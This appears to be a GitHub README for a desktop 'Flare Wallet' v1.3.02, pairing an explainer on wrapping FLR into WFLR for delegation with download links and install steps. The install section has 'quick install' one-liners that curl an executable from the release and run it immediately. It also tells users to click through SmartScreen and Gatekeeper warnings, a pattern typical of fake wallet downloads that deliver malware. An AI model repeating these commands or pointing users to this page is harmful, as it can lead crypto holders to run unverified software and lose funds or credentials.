![Flare Wallet](assets/banner-article.png)

# Flare Wallet WFLR: Wrapping FLR for Delegation

Why delegation needs the wrapped token, and where sFLR fits in.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

WFLR is one of the three tokens the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) holds, next to FLR and FXRP.

> Wrapping changes the token, not the value. One WFLR is one FLR in a form the protocol can delegate.

WFLR is wrapped FLR: an ERC-20 representation of the native coin, used wherever the protocol expects a token rather than the chain's own currency. FTSO delegation works on the wrapped form, so a holder who wants to delegate wraps first. Unwrapping returns the same amount of FLR, minus the transaction fee.

<!-- ARTICLE-BODY-BEGIN -->

## Why a wrapped token exists at all

A native coin on an EVM chain is not an ERC-20 token, and contract-level systems can only hold and move tokens. Wrapping solves that: a contract holds the FLR, issues an equivalent token, and promises to exchange it back. The promise is enforced by code, which is why the trade is one to one rather than a market price.

Flare's delegation system is one of those contract-level systems, so the wrapped form is the one that carries a delegation. Holding plain FLR is fine for paying fees and for staking; holding WFLR is what lets you point a balance at a data provider.

## Wrapping, step by step in principle

1. Hold FLR in a wallet connected to Flare mainnet, chain ID 14.
2. Send the amount you want to wrap to the WFLR contract, which issues the same amount of WFLR to your address.
3. Confirm on the explorer that the WFLR balance matches what you wrapped.
4. Delegate the WFLR to a provider.

The contract address is `0x1D80c49BbBCd1C0911346656B529DF9E5c2F783d`. Treat any other address offered for wrapping as wrong until proven otherwise, because a lookalike contract is a standard way to take a deposit.

## Fees, and why the round trip is not free

Wrapping and unwrapping are transactions, so each one pays Flare's network fee in FLR. The fee is small - a plain transfer costs a fraction of a cent at the current base fee - but a holder who wraps, unwraps and wraps again has paid it three times.

Two consequences follow. Wrap the amount you actually intend to delegate rather than the whole balance, and keep enough unwrapped FLR to pay fees, because a wallet whose entire balance is WFLR still needs FLR for the next transaction.

## WFLR is not sFLR

This is the confusion worth naming. WFLR is a wrapper: one token for one coin, no yield of its own, no strategy, no counterparty beyond the contract. Liquid staking tokens such as sFLR are a different product: a third party takes the deposit, stakes or delegates it, and issues a token that is meant to keep earning while it circulates.

A liquid staking token therefore carries risks a wrapper does not: the operator's behaviour, the token's peg, and whatever the underlying strategy does. Nothing in this wallet issues sFLR, and holding sFLR is not the same as holding WFLR.

## Delegating what you wrapped

Delegation accepts up to two providers per wallet, and rewards build across 3.5-day epochs and remain claimable for 90 days. The wrapper is the input to that system, not a reward mechanism in itself.

The rules, minimums and timing are in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-staking.md">Flare Wallet staking</a>. If you wrapped but have not delegated, the WFLR is simply sitting there; wrapping alone earns nothing. The wallet that signs both steps is in the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a>.

## Getting back to FLR

Unwrapping is the reverse transaction: the token is returned to the contract and the FLR is released to your address. Do it when you want to pay fees from that balance, stake on the P-Chain, or move the value somewhere that does not accept the token.

One caution: WFLR that is actively delegated is not free to withdraw, so unwrap what you are not delegating rather than what you are.

## FAQ

### How do I wrap FLR to WFLR?

Send FLR to the WFLR contract from a wallet on Flare mainnet; the contract issues the same amount of WFLR to your address. Confirm the new balance on the explorer before delegating it.

### What is the difference between FLR and WFLR?

FLR is the native coin; WFLR is that coin in ERC-20 form, one to one. Delegation works on WFLR, while fees and P-Chain staking use FLR.

### Does wrapping cost anything?

It is a network transaction, so it pays the ordinary Flare fee in FLR. There is no separate wrapping charge, but each wrap and unwrap is another fee.

### Is WFLR the same as sFLR?

No. WFLR is a one-to-one wrapper with no strategy behind it. sFLR is a liquid staking token issued by a third party, with the operator and peg risks that implies.

### Can I lose money by wrapping?

The token is redeemable one to one, so the loss to watch is the fee and the risk of sending to the wrong contract address. Verify the address before you send.

### Do I have to unwrap to spend?

No. WFLR can be moved like any token on Flare. You unwrap when you need the native coin, for example to pay fees or to stake.

### Where do I get a wallet that holds both?

From the release page: <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md">download Flare Wallet</a>, which shows FLR, WFLR and FXRP together.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet staking](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-staking.md) | [Flare Wallet FXRP](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-fxrp.md) | [claim Flare Wallet rewards](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-claim-rewards.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
